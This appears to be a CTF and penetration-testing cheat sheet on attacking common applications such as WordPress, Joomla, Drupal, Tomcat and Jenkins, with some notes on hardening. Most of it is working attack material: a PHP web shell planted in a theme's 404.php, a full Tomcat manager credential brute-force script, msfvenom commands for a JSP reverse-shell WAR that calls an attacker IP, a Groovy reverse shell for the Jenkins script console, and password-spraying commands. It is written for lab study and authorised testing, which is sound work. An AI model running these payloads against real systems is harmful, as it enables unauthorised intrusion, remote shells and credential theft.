# Attacking Common Applications — CTF & Pentesting Cheat Sheet

This document provides a **high-level methodology** for discovering, enumerating, and attacking commonly encountered applications during **CTFs, HTB labs, and authorised penetration tests**.

---

## Notetaking Setup
Keeping detailed logs and notes will help us greatly with the final report. Set up the skeleton of the report at the beginning of the assessment so we can begin filling in certain sections of the report while waiting for a scans to finish.

- External Penetration - < Test Client Name >  
  - Scope (including in-scope IP addresses/ranges, URLs, any fragile hosts, testing timeframes, and any limitations or other relative information we need handy)  
  - Client Points of Contact  
  - Credentials  
  - Discovery/Enumeration  
    - Scans  
    - Live hosts   
  - Application Discovery   
    - Scans
    - Interesting/Notable Hosts  
  - Exploitation  
    - < Hostname or IP > 
    - < Hostname or IP >  
  - Post-Exploitation  
    - < Hostname or IP >  
    - < Hostname or IP >
   

## Application Discovery & Enumeration
Before attacking any application, it is critical to **identify what is running**, how it is configured, and what attack surface exists.

### Key Enumeration Goals
- Identify application type and version
- Detect authentication mechanisms
- Discover exposed endpoints and admin panels
- Identify third-party plugins or integrations

### Common Techniques
```bash
whatweb http://target
nmap -sV -p 80,443 target
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list.txt
````

```bash
gobuster dir -u http://target -w wordlist.txt
```

### Webpage Screen Shots
Done with eyewitness
```bash
sudo apt install eyewitness
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list.txt
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```
---

## Content Management Systems (CMS)

### Target Platforms
* WordPress
* Drupal
* Joomla

### Enumeration Strategy
* Identify CMS and version
* Enumerate plugins, themes, and users
* Check for outdated or vulnerable components

### Common Attacks
* Exploiting vulnerable plugins/themes
* Weak admin credentials
* File upload vulnerabilities
* Configuration file exposure

### Example Tools & Commands
* Try to browse the following directories /wp-admin /wp-content /wp-content/plugins /wp-content/themes... look for readme.xt files within
* Check out /robots.xml file

```bash
curl -s http://blog.inlanefreight.local | grep WordPress
curl -s http://blog.inlanefreight.local/ | grep themes
curl -s http://blog.inlanefreight.local/ | grep plugins
curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
curl -s http://dev.inlanefreight.local/ | grep Joomla
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
wpscan --url http://blog.inlanefreight.local --enumerate
wpscan --password-attack xmlrpc -t 20 -U duog -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
wpscan --url http://target --enumerate vp,vt,u
curl -s http://drupal.inlanefreight.local | grep Drupal
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
visit http://drupal.inlanefreight.local/node/1
droopescan scan drupal -u http://drupal.inlanefreight.local
```

```bash
sudo pip3 install droopescan
droopescan scan joomla --url http://dev.inlanefreight.local/
droopescan scan wordpress --url http://blog.inlanefreight.local/
droopescan scan drupal -u http://target
wget https://github.com/ajnik/joomla-bruteforce/blob/master/joomla-brute.py
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```
An inactive theme can be selected to avoid corrupting the primary theme. We already know that the active theme is Transport Gravity. An alternate theme such as Twenty Nineteen can be chosen instead.

Click on Select after selecting the theme, and we can edit an uncommon page such as 404.php to add a web shell.

        php
system($_GET[0]);

The code above should let us execute commands via the GET parameter 0. We add this single line to the file just below the comments to avoid too much modification of the contents.
Click on Update File at the bottom to save. We know that WordPress themes are located at /wp-content/themes/<theme name>. We can interact with the web shell via the browser or using cURL. As always, we can then utilize this access to gain an interactive reverse shell and begin exploring the target
http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id

---

## ☕ Tomcat & Jenkins

### Apache Tomcat

**What to Look For**
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 
gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
msfconsole then use module auxiliary(scanner/http/tomcat_mgr_login
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
```bash
mgr_brute.py
python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
#!/usr/bin/python

import requests
from termcolor import cprint
import argparse

parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")

parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")

args = parser.parse_args()

url = args.url
uri = args.path
users_file = args.usernames
passwords_file = args.passwords

new_url = url + uri
f_users = open(users_file, "rb")
f_pass = open(passwords_file, "rb")
usernames = [x.strip() for x in f_users]
passwords = [x.strip() for x in f_pass]

cprint("\n[+] Atacking.....", "red", attrs = ['bold'])

for u in usernames:
    for p in passwords:
        r = requests.get(new_url,auth = (u, p))

        if r.status_code == 200:
            cprint("\n[+] Success!!", "green", attrs = ['bold'])
            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
            break
    if r.status_code == 200:
        break

if r.status_code != 200:
    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
#print r.status_code
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
nc -lnvp 4443

**

* `/manager/html` or `/host-manager`
* Default credentials
* WAR file upload functionality

**Attack Methods**

```bash
hydra -l tomcat -P passwords.txt http-get://target/manager/html
```

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker LPORT=4444 -f war > shell.war
```

---

### Jenkins

**What to Look For**
http://jenkins.inlanefreight.local:8000/configureSecurity/

http://jenkins.inlanefreight.local:8000/script
def cmd = 'ls /var/lib/jenkins3'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout

or windows
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

* Anonymous access
* Script Console (`/script`)
* Stored credentials

**Attack Methods**

```groovy
println "id".execute().text
```

```bash
curl http://target/script
```

---

## 📊 Infrastructure Monitoring Tools

### Splunk

**Enumeration**

* Login portals (`/en-US/account/login`)
* Default credentials
* Installed apps

**Common Attacks**

* Command execution via scripted inputs
* Credential reuse
* Abusing saved searches

```bash
splunk search 'index=_internal'
```

---

### PRTG Network Monitor

**Enumeration**

* Web interface discovery
* API endpoints
* Version identification

**Common Attacks**

* Auth bypass vulnerabilities
* Credential reuse
* Command execution via notifications

```bash
nmap -p 80,443 --script http-enum target
```

---

## 🎟️ Customer Service & Configuration Management Tools

### osTicket

**Enumeration**

* Public ticket submission
* File upload functionality
* Admin panel exposure

**Common Attacks**

* Uploading malicious attachments
* Ticket-based command injection
* Credential harvesting

```bash
gobuster dir -u http://target/osticket -w wordlist.txt
```

---

### GitLab

**Enumeration**

* Public repositories
* CI/CD pipelines
* Issue trackers

**Common Attacks**

* Leaked secrets in repos
* CI job command execution
* OAuth misconfigurations

```bash
git clone http://target/repo.git
```

```bash
grep -r "password" .
```

---

## 🧪 Other Commonly Seen Applications

| Application   | Attack Focus                      |
| ------------- | --------------------------------- |
| phpMyAdmin    | Weak creds, file import           |
| Adminer       | DB access, file uploads           |
| Webmin        | Auth bypass, RCE                  |
| Elasticsearch | Open APIs, data exposure          |
| Kibana        | Console abuse                     |
| Grafana       | Default creds, dashboard exploits |

Example:

```bash
curl http://target:9200/_cat/indices?v
```

---

## 🛡️ Application Hardening – Core Concepts

Understanding hardening helps attackers **recognise misconfigurations**.

### Key Defensive Controls

* Strong authentication and MFA
* Patch management
* Least privilege access
* Input validation
* Secure file upload handling
* Proper logging and monitoring

### Attacker Indicators of Weak Hardening

* Default credentials work
* Outdated software versions
* Anonymous or guest access
* Sensitive endpoints exposed
* Excessive permissions

---



